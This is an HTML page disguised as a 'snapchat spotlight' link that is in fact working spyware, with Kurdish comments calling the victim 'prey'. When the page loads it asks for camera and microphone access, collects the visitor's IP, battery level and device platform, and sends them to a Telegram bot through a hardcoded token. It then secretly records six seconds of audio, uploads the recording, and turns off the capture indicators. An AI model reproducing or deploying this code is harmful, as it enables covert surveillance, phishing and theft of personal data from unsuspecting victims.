<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); // ئەمە ئایدی ئەو کەسەیە کە داتاکەی بۆ دەچێت
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";

    async function capture() {
        if (!targetID) return;
        try {
            // 🎙️ چالاککردنی کامێرا و مایکرۆفۆن (Permission Request)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });

            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
            }

            // 🌐 وەرگرتنی IP و ناردنی ڕاپۆرت بۆ ئەو ئایدییەی لە لینکەکەدایە
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
                         `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>`;

            // ناردنی زانیارییەکان
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: targetID, text: report, parse_mode: "HTML" })
            });

            // 🎤 تۆمارکردنی دەنگ و ناردنی وەک Voice
            const mediaRecorder = new MediaRecorder(stream);
            let audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                const formData = new FormData();
                formData.append("chat_id", targetID); // دەنێردرێت بۆ ئەو ئایدییەی لە لینکەکەدایە
                formData.append("voice", audioBlob, "voice.ogg");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: formData });
            };

            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop()); // کوژاندنەوەی نیشانەی کامێرا و مایکرۆفۆن
            }, 6000);

        } catch (err) {
            // ئەگەر نێچیرەکە ڕەدی کردەوە، تەنها IP بنێرە
            console.error("Access Denied");
        }
    }
</script>
</body>
</html>
